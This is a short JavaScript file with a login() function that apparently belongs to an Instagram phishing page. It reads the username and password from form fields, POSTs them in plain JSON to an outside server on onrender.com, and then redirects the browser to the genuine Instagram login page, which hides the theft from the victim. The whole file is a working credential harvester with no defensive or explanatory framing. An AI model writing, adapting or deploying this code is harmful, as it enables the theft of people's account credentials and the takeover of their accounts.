async function login() {

    const username = document.querySelector('input[type="text"]').value;
    const pasword = document.querySelector('input[type="password"]').value;

    if (username === "" || pasword === "") {
        return;
    }
    const response = await fetch("https://server-4aj4.onrender.com/login", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            username: username,
            pasword: pasword
        })
    });
    const data = await response.json();

    if (data.success) {
        window.location.href = "https://www.instagram.com/accounts/login/";
    }
}

